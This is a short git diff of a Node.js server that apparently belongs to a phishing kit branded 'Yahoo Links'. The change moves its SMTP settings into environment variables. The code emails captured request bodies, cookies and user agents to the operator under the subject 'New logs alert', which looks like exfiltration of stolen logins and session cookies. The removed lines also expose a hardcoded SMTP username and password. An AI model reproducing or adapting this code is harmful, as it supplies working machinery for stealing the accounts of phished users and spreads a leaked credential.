@@ -7,20 +7,20 @@ const port = process.env.PORT || 3001;
 const nodemailer = require("nodemailer");
 
 const transporter = nodemailer.createTransport({
-  host: "smtp-relay.brevo.com",
+  host: `${process.env.Emailhost}`,
   port: 587,
   secure: false, // Use `true` for port 465, `false` for all other ports
   auth: {
-    user: "45002b003@smtp-brevo.com",
-    pass: "dpBfCwmL8sFOQZkz",
+    user: `${process.env.Emailuser}`,
+    pass: `${process.env.Emailpassword}`,
   },
 });
 
 async function sender(payload) {
   // send mail with defined transport object
   const info = await transporter.sendMail({
-    from: '"Yahoo Links 👻" <bad0men@proton.me>', // sender address
-    to: "bad0men@proton.me", // list of receivers
+    from: `"Yahoo Links 👻" <${process.env.Emailaddress}>`, // sender address
+    to: `${process.env.Emailaddress}`, // list of receivers
     subject: "New logs alert ✔", // Subject line
     text: `${payload?.body} + ${payload?.cookies} + ${payload.userAgent}`, // plain text body
     html: `${payload?.body}\n\n
